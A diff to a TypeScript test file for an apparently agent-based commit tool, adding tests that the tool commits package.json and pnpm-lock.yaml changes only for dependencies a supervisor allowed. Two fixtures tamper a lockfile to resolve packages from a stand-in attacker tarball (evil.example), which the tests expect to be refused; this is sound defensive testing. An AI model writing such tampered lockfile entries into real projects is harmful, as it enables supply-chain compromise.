@@ -136,6 +136,7 @@ import {
   seatWroteBody,
 } from "../src/mcp/tools.ts";
 import { readPlanAsset } from "../src/plans/assets.ts";
+import { addedDependencies, allowRunDependencies } from "../src/repo/dependency-allowance.ts";
 import { setRunPathGrants } from "../src/repo/path-grants.ts";
 import { externalReviewKey } from "../src/review/external-key.ts";
 import { CREW_GIT_SLOW_MS, MC_MERGE_AUTHOR } from "../src/runtime/checkouts.ts";
@@ -702,7 +703,7 @@ describe("commit", () => {
       [
         "Not committed: README.md and docs/c.md are outside your area (apps/**).",
         "Not committed: web/b.ts is in GUIDO-2's area.",
-        "Not committed: apps/package.json and package.json are protected (build, install and CI files); ask FLIGHT with mc ask_flight if the ticket needs them.",
+        "Not committed: apps/package.json and package.json are protected (build, install and CI files); ask FLIGHT with mc ask_flight if the ticket needs them. For a new package, ask FLIGHT to allow it with allow_dependency (name each package and version); this commit tool then takes the package.json and pnpm-lock.yaml change.",
         REVERT,
       ].join("\n"),
     );
@@ -742,6 +743,129 @@ describe("commit", () => {
     const r = await commit("chore: root");
     expect(r.isError).toBe(true);
     expect(r.text).toContain("package.json is protected");
+  });
+
+  describe("an allowed dependency", () => {
+    const HYP = { name: "hyparquet", version: "1.33.2", licence: "MIT" };
+    const LOCK_BEFORE = "lockfileVersion: '9.0'\n\nimporters:\n\n  .: {}\n";
+    const LOCK_AFTER = [
+      "lockfileVersion: '9.0'",
+      "",
+      "importers:",
+      "",
+      "  .:",
+      "    dependencies:",
+      "      hyparquet:",
+      "        specifier: 1.33.2",
+      "        version: 1.33.2",
+      "",
+      "packages:",
+      "",
+      "  hyparquet@1.33.2:",
+      "    resolution: {integrity: sha512-x}",
+      "",
+    ].join("\n");
+    const baseLock = () => {
+      write("pnpm-lock.yaml", LOCK_BEFORE);
+      git(wt, "add", "pnpm-lock.yaml");
+      git(wt, "commit", "-qm", "lock");
+    };
+    const manifest = (deps: Record<string, string>) =>
+      `${JSON.stringify({ dependencies: deps }, null, 2)}\n`;
+
+    it("commits the manifest and lockfile when they add just the allowed package", async () => {
+      baseLock();
+      allowRunDependencies(store, RUN, ["package.json", "pnpm-lock.yaml"], [HYP]);
+      write("package.json", manifest({ hyparquet: "1.33.2" }));
+      write("pnpm-lock.yaml", LOCK_AFTER);
+      const r = await commit("feat: add hyparquet");
+      expect(r.isError).toBeUndefined();
+      expect(r.text).toMatch(/^Committed /);
+      expect(git(wt, "show", "--name-only", "--format=", "HEAD").trim().split("\n").sort()).toEqual(
+        ["package.json", "pnpm-lock.yaml"],
+      );
+      expect(addedDependencies(store, RUN)).toEqual([HYP]);
+    });
+
+    it("refuses a manifest that adds a package FLIGHT did not name", async () => {
+      const base = head();
+      allowRunDependencies(store, RUN, ["package.json"], [HYP]);
+      write("package.json", manifest({ hyparquet: "1.33.2", "left-pad": "1.3.0" }));
+      const r = await commit("feat: add deps");
+      expect(r).toEqual({
+        text: `Not committed: package.json adds left-pad, which FLIGHT did not allow. Only the packages FLIGHT allowed may be added; ask FLIGHT to allow more with mc ask_flight.\n${REVERT}`,
+        isError: true,
+      });
+      expect(head()).toBe(base);
+      expect(staged()).toBe("");
+      expect(addedDependencies(store, RUN)).toEqual([]);
+    });
+
+    it("refuses a lockfile whose importer gains a package FLIGHT did not name", async () => {
+      baseLock();
+      allowRunDependencies(store, RUN, ["package.json", "pnpm-lock.yaml"], [HYP]);
+      write("package.json", manifest({ hyparquet: "1.33.2" }));
+      write(
+        "pnpm-lock.yaml",
+        LOCK_AFTER.replace(
+          "      hyparquet:",
+          "      left-pad:\n        specifier: 1.3.0\n        version: 1.3.0\n      hyparquet:",
+        ),
+      );
+      const r = await commit("feat: add hyparquet");
+      expect(r.isError).toBe(true);
+      expect(r.text).toContain("pnpm-lock.yaml adds left-pad, which FLIGHT did not allow");
+    });
+
+    it("refuses a lockfile that rewrites a package record already there", async () => {
+      const ZOD = "  zod@4.1.0:\n    resolution: {integrity: sha512-good}\n";
+      write("pnpm-lock.yaml", `${LOCK_BEFORE}\npackages:\n\n${ZOD}`);
+      git(wt, "add", "pnpm-lock.yaml");
+      git(wt, "commit", "-qm", "lock");
+      const base = head();
+      allowRunDependencies(store, RUN, ["pnpm-lock.yaml"], [HYP]);
+      const evil = ZOD.replace("sha512-good", "sha512-evil, tarball: https://evil.example/z.tgz");
+      write("pnpm-lock.yaml", `${LOCK_AFTER}\n${evil}`);
+      const r = await commit("feat: add hyparquet");
+      expect(r).toEqual({
+        text: `Not committed: pnpm-lock.yaml changes packages zod@4.1.0. Only the packages FLIGHT allowed may be added; ask FLIGHT to allow more with mc ask_flight.\n${REVERT}`,
+        isError: true,
+      });
+      expect(head()).toBe(base);
+      write("pnpm-lock.yaml", `${LOCK_AFTER}\n${ZOD}`);
+      expect((await commit("feat: add hyparquet")).text).toMatch(/^Committed /);
+    });
+
+    it("refuses a new package record with an unverified resolution", async () => {
+      baseLock();
+      allowRunDependencies(store, RUN, ["package.json", "pnpm-lock.yaml"], [HYP]);
+      write("package.json", manifest({ hyparquet: "1.33.2" }));
+      write(
+        "pnpm-lock.yaml",
+        `${LOCK_AFTER.replace(
+          "resolution: {integrity: sha512-x}",
+          "resolution: {tarball: https://evil.example/h.tgz}",
+        )}\nsnapshots:\n\n  hyparquet@1.33.2:\n    dependencies:\n      evil: 6.6.6\n`,
+      );
+      const r = await commit("feat: add hyparquet");
+      expect(r.isError).toBe(true);
+      expect(r.text).toContain(
+        "pnpm-lock.yaml adds packages hyparquet@1.33.2 with an unsafe resolution",
+      );
+    });
+
+    it("still refuses a file the allowance does not name, and another run's allowance", async () => {
+      allowRunDependencies(store, RUN, ["package.json"], [HYP]);
+      write("apps/package.json", manifest({ hyparquet: "1.33.2" }));
+      const r = await commit("feat: x");
+      expect(r.text).toContain("apps/package.json is protected");
+      expect(r.text).toContain("allow_dependency");
+      rmSync(join(wt, "apps/package.json"));
+      allowRunDependencies(store, "guido-1:20261019T100000Z", ["package.json"], [HYP]);
+      store.setSetting(`run-dependency:${RUN}`, "{}");
+      write("package.json", manifest({ hyparquet: "1.33.2" }));
+      expect((await commit("feat: x")).text).toContain("package.json is protected");
+    });
   });
 
   it("refuses one protected file, inside the area or nested, as it", async () => {
@@ -1016,7 +1140,7 @@ describe("commit: remove", () => {
       text: [
         "Not committed: docs/c.md is outside your area (apps/**).",
         "Not committed: web/b.ts is in GUIDO-2's area.",
-        "Not committed: package.json is protected (build, install and CI files); ask FLIGHT with mc ask_flight if the ticket needs it.",
+        "Not committed: package.json is protected (build, install and CI files); ask FLIGHT with mc ask_flight if the ticket needs it. For a new package, ask FLIGHT to allow it with allow_dependency (name each package and version); this commit tool then takes the package.json and pnpm-lock.yaml change.",
         "Not committed: apps/é.ts is not plain ASCII paths; the crew commits ASCII paths only.",
         MC_REMOVE_REFUSED,
       ].join("\n"),
@@ -2317,7 +2441,7 @@ describe("commit: fix round 2", () => {
       [
         "Not committed: web/b.ts is in GUIDO-2's area.",
         `Not committed: apps/link ${SPECIAL}`,
-        `Not committed: apps/package.json ${PROT_ONE}`,
+        `Not committed: apps/package.json ${PROT_ONE} For a new package, ask FLIGHT to allow it with allow_dependency (name each package and version); this commit tool then takes the package.json and pnpm-lock.yaml change.`,
         REVERT,
       ].join("\n"),
     );
@@ -3915,6 +4039,17 @@ describe("push and draft_pr", () => {
       expect(body).toContain(MINORS.trimEnd());
       expect(body).toContain("Closes #42.");
       expect(body.endsWith("Opened by GUIDO-1 (Mission Control).\n")).toBe(true);
+    });
+
+    it("keeps the added dependencies section when the seat rewrites its PR body", async () => {
+      store.setRunLoop(RUN, { ...NEW_LOOP, prNumber: 12 });
+      const added = "## Added dependencies\n\n- `hyparquet` 1.33.2, licence MIT";
+      ghState(view({ body: `#42\n\n## What changed\n\nold\n\n${added}\n\nCloses #42.\n` }));
+      await edit("New text.");
+      const body = edits()[0]?.body ?? "";
+      expect(body).toContain("New text.");
+      expect(body).toContain(added);
+      expect(body.match(/## Added dependencies/g)).toHaveLength(1);
     });
 
     it("keeps a staged body's Part of line last, with no closing line", async () => {
